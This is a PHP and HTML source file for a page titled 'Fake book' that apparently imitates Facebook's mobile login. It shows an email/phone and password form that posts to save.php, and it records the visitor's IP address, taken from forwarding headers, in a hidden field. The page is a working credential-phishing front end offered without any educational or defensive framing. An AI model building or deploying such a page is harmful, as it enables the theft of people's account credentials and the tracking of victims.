<?php
	$ip = $_SERVER['REMOTE_ADDR'];

    if (!empty($_SERVER['HTTP_CLIENT_IP'])) {
        $ip = $_SERVER['HTTP_CLIENT_IP'];
    } else if (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
        $ip = $_SERVER['HTTP_X_FORWARDED_FOR'];
    }
?>
<!DOCTYPE html>
<html lang="en">
<head>
	<meta charset="UTF-8">
	<title>Fake book</title>
	<link rel="stylesheet" type="text/css" href="css.css">
</head>
<body onload="setFocus();">
	<div id="wrapper">
		<div id="mobile1">
			<button id="btnsign1">New user</button>
		</div>
		<div id="mobile2">
			<form action="save.php" method="post">
				&nbsp;&nbsp;Email/Phone<br />
				<input type="text" class="txtinput" name="user" id="user"><br />
				&nbsp;&nbsp;Password<br />
				<input type="password" class="txtinput" name="pass"><br />
				<input type="hidden" name="ip" value="<?php echo $ip; ?>">
				<input type="submit" id="submit" name="submit" value="Login"><br />
			</form>
			<p id="txtor">-----Or-----</p>
			<button id="btnsign2">New user</button><br />
			&nbsp;&nbsp;Forgot?<br />
			&nbsp;&nbsp;Help<br />
		</div>
	</div>
<script type="text/javascript">
	function setFocus(){
		document.getElementById("user").focus();
	}
</script>
</body>
</html>